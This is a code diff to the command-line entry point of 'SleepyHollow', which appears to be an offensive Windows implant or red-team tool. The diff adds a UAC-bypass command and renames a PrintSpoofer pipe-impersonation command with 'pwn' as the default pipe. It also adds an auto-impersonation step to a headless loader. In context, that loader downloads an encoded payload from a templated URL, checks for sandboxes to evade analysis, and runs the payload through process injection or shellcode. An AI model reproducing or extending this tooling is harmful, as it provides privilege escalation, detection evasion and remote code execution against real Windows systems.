@@ -1,16 +1,21 @@
-using SleepyHollow;
+﻿using SleepyHollow;
+
 #if !HEADLESS
 var commands = new Dictionary<string, Dictionary<string, string>>
 {
     { "user", new Dictionary<string, string>() },
     {
-        "printspoofer",
+        "spool",
         new Dictionary<string, string>
         {
-            { "pipe", "name of pipe to" },
+            { "pipe", "name of pipe (optional - defaults to 'pwn')" },
             { "payload", "path/URL to payload (ignored if --cmd is used)" },
             { "cmd", "command to execute after impersonation (optional)" }
         }
+    },
+    {
+        "uac",
+        new Dictionary<string, string> { { "cmd", "command to execute as Administrator" } }
     },
     {
         "sc",
@@ -42,8 +47,8 @@ var commands = new Dictionary<string, Dictionary<string, string>>
 };
 var globalSwitches = new Dictionary<string, string>
 {
-    { "--skip-evasion", "do not perform sandbox evasion checks" },
-    { "--debug", "enable debug logging" }
+    { "skip-evasion", "do not perform sandbox evasion checks" },
+    { "debug", "enable debug logging" }
 };
 
 if (args.Length == 0)
@@ -108,8 +113,8 @@ switch (options["command"])
             Console.WriteLine($"  {kvp.Key, -35}: {(kvp.Value ? "Enabled" : "Disabled"), 10}");
         }
         break;
-    case "printspoofer":
-        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : "\\\\.\\pipe\\test\\pipe\\spoolss";
+    case "spool":
+        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : "pwn";
         var payloadUrl = options.ContainsKey("payload") ? options["payload"] : null;
         var executeCmd = options.ContainsKey("cmd") ? options["cmd"] : null;
         if (payloadUrl == null && executeCmd == null)
@@ -118,7 +123,7 @@ switch (options["command"])
             Environment.Exit(1);
         }
 
-        PrintSpoofer.Spoof(pipeName, payloadUrl, executeCmd);
+        await PrintSpoofer.AutoSpoof(pipeName, payloadUrl, executeCmd);
         break;
     case "sc":
         var url = options["payload"];
@@ -153,6 +158,10 @@ switch (options["command"])
         var raw = options.ContainsKey("raw") && options["raw"] == "true";
         await RemoteExecution.Run(host, cmd, serviceName: service, rawCmd: raw);
         break;
+    case "uac":
+        var uacCmd = options["cmd"];
+        UACBypass.RunAsAdministrator(uacCmd);
+        break;
     default:
         Console.WriteLine($"Unknown command {options["command"]}");
         break;
@@ -172,6 +181,9 @@ if (EvasionCheck.Detected)
 var httpClient = new HttpClient();
 var data = await httpClient.GetStringAsync("<%URL%>");
 var buf = Decoder.DecodeString(data);
+#if IMPERSONATE
+await PrintSpoofer.AutoSpoof("pwn", "<%URL%>", null);
+#endif
 #if INJECT
 await InjectProcess.Run(buf);
 #else
